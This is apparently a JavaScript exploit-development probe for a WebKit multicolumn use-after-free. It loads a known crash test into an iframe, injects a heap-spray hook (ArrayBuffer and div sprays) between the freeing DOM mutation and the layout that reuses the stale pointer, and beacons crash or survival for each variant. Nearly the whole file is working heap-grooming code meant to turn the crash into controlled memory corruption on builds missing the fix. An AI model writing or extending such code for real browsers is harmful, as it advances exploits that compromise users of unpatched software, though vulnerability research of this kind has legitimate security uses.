// fa-sink2 — exact replicate of corpus case 154 (multicol stale cache) with
// the controlled mutation→layout window
//
// The sink battery's reconstruction of the test did not kill (environment
// drift). This probe loads the EXACT corpus test file
// (LayoutTests_fast_multicol_last-set-crash.html) via XHR, injects the
// spray hook between the mutation (x23.prepend(x28)) and the use
// (execCommand's synchronous layout), and writes it into an iframe — the
// same environment that killed in the corpus walk (case 154: mklmr5,
// BEFORE-154 with no GAP).
//
// Variants:
//   baseline  — no spray: the kill must replicate here first
//   abspray  — ArrayBuffers 128-1024 in the window (heap, no CSS context)
//   divspray — 200 divs created INSIDE the iframe document (under the test's
//              universal multicol CSS — RenderMultiColumnSet-class objects)
//
// The window: prepend invalidates the raw m_lastSetWorkedOn cache by moving
// the multicol set; execCommand's layout then dereferences it (BZ 264327,
// fix de47ae40 absent from this build). Everything between the two is pure JS
// — attacker-sized.
//
// Crash-resume: killed steps are skipped on the next guide load (localStorage).
// Beacon prefix: VS2-
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = BASE + '/beacon/VS2-' + tag + '?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 300));
      x.open('GET', u, true);
      x.send();
    } catch(e) {}
  }

  B('BOOT');

  var TEST_URL = BASE + '/corpus/LayoutTests_fast_multicol_last-set-crash.html';

  function phaseA(variant, sprayFn, next) {
    B('A-' + variant + '-START');
    var xhr = new XMLHttpRequest();
    xhr.open('GET', TEST_URL + '?t=' + Date.now(), true);
    xhr.onload = function() {
      var src = xhr.responseText;
      var needle = 'x23.prepend(x28);';
      if (src.indexOf(needle) < 0) {
        B('A-' + variant + '-NOHOOK', 'needle not found');
        setTimeout(next, 300);
        return;
      }
      // inject the spray hook between the mutation and the selection/execCommand
      src = src.replace(needle,
        needle + 'if (window.parent && window.parent.__sprayHook) window.parent.__sprayHook();');
      src = src.replace('if (window.testRunner)', 'if (false)');

      var frame = document.createElement('iframe');
      frame.style.cssText = 'width:320px;height:200px';
      document.body.appendChild(frame);
      var doc = frame.contentDocument;
      doc.open();
      doc.write(src);
      doc.close();
      window.__sprayFrame = frame;
      window.__sprayHook = function() {
        B('A-' + variant + '-WINDOW');
        try { sprayFn(frame); } catch (e) { B('A-' + variant + '-SPRAY-X'); }
      };
      var guard = 0;
      var timer = setInterval(function() {
        guard++;
        if (guard > 16) {
          clearInterval(timer);
          B('A-' + variant + '-TIMEOUT');
          try { frame.parentNode.removeChild(frame); } catch (e) {}
          setTimeout(next, 300);
        }
      }, 500);
      // the test finishes synchronously at onload — survival is observable by
      // the interval reaching its end without a process death.
      var watch = setInterval(function() {
        try {
          var t = doc.body ? doc.body.textContent : '';
          if (t.indexOf('PASS') >= 0) {
            clearInterval(watch); clearInterval(timer);
            B('A-' + variant + '-DONE');
            try { frame.parentNode.removeChild(frame); } catch (e) {}
            setTimeout(next, 300);
          }
        } catch (e) { clearInterval(watch); }
      }, 250);
    };
    xhr.onerror = function() { B('A-' + variant + '-FETCH-X'); setTimeout(next, 300); };
    xhr.send();
  }

  var AB_SIZES = [128, 192, 256, 320, 384, 448, 512, 640, 768, 1024];
  function sprayABs(frame) {
    var keep = [];
    for (var s = 0; s < AB_SIZES.length; s++)
      for (var c = 0; c < 30; c++) keep.push(new ArrayBuffer(AB_SIZES[s]));
    window.__abKeep = keep;
  }
  function sprayDivs(frame) {
    // inside the IFRAME: under the universal multicol CSS, each div becomes a
    // multicolumn block — RenderMultiColumnSet-class allocations
    var d = frame.contentDocument;
    if (!d) return;
    var keep = [];
    for (var i = 0; i < 200; i++) {
      var div = d.createElement('div');
      div.className = 'd' + (i % 8);
      d.body.appendChild(div);
      keep.push(div);
    }
    window.__divKeep = keep;
    d.body.offsetHeight; // force attach of the spray renderers
  }

  // ── plan with localStorage crash-resume ────────────────────────────────
  var STEP_KEY = 'vs2-step-v1';
  var startStep = 0;
  try { startStep = parseInt(localStorage.getItem(STEP_KEY) || '0', 10) || 0; } catch (e) {}
  function saveStep(i) {
    try { localStorage.setItem(STEP_KEY, String(i)); } catch (e) {}
  }

  var plan = [
    function(next) { phaseA('baseline', function() {}, next); },
    function(next) { phaseA('abspray', sprayABs, next); },
    function(next) { phaseA('divspray', sprayDivs, next); }
  ];

  B('PLAN', 'steps=' + plan.length + ' from=' + startStep);
  function run() {
    var step = plan[startStep];
    if (!step) { B('DONE-ALL-SURVIVED'); return; }
    saveStep(startStep + 1);
    step(function() {
      startStep++;
      var next = plan[startStep];
      if (!next) { B('DONE-ALL-SURVIVED'); return; }
      saveStep(startStep + 1);
      next(run);
    });
  }
  setTimeout(run, 200);
})();
